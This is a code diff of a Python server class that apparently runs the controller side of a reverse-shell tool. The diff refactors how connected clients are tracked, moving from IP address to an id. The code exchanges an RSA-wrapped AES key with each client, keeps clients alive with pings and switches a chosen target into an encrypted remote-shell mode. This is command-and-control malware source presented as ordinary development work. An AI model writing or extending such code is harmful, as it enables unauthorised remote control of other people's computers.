@@ -23,19 +23,21 @@ class Server(object):
         self.sleepPerPing = 60
         self.sleepPeriter = 2        
        
-    def setCipher(self,conn):
+    def setCipher(self,conn, id):
         msg = conn.recv(self.rsaBlock)
         key = self.rsa.decrypt(
             self.PrivateKey,
             msg
         )
         self.connections.addAesToconnection(
-            conn,
+            id,
             AesCrypto(key, None)
         ) 
 
 
-    def ping(self, conn, ip, timeout=5):
+    def ping(self, conn, id, timeout=5):
+        print(id)
+        print(conn)
         try:
             conn.send(randombyte())
             conn.settimeout(timeout)
@@ -45,18 +47,18 @@ class Server(object):
                 return True
         except (socket.timeout, ConnectionResetError, BrokenPipeError, OSError):
             pass
-        if self.connections.isconnected(ip):
+        if self.connections.isconnected(id):
             return True
         return False
     
 
-    def keepAlive(self, conn, timeout=5):
+    def keepAlive(self, conn, id, timeout=5):
         def __internal__():
-            ip = conn.getpeername()[0]
+            
             while True:
-                if not self.connections.isconnected(ip):
+                if not self.connections.isconnected(id):
                     print("Status Completed and async")
-                    if not self.ping(conn=conn,ip=ip,timeout=timeout):
+                    if not self.ping(conn=conn,id=id,timeout=timeout):
                         print('NotPing')
                         self.connections.removeConnection(conn)
                 time.sleep(self.sleepPerPing)
@@ -65,22 +67,21 @@ class Server(object):
     
     def onConnect(self,conn,addr):
         clientInfo = self.retriveClientInfo(conn)
+        id = self.connections.getId(clientInfo, addr[0])
         self.connections.insertNewConnction(conn, clientInfo)
-        self.keepAlive(conn=conn)
+        self.keepAlive(conn=conn, id=id)
         while True:
-            if self.connections.connctTo == addr[0]:
-                self.connections.connectToTarget(conn)
-                self._setShellMode(conn)
-            elif not self.connections.alive(addr[0]):
+            if self.connections.connctTo == id:
+                self.connections.connectToTarget(conn, id)
+                self._setShellMode(conn, id)
+            elif not self.connections.alive(id):
                 return
             time.sleep(self.sleepPeriter)
                                
 
-    def _setShellMode(self,conn):
-        print('Satrting RevrseShell...')
-        self.setCipher(conn)
-        ip = conn.getpeername()[0]
-        while self.connections.isconnected(ip):
+    def _setShellMode(self,conn, id):
+        self.setCipher(conn,id)
+        while self.connections.isconnected(id):
             time.sleep(5)
 
     def retriveClientInfo(self,conn):
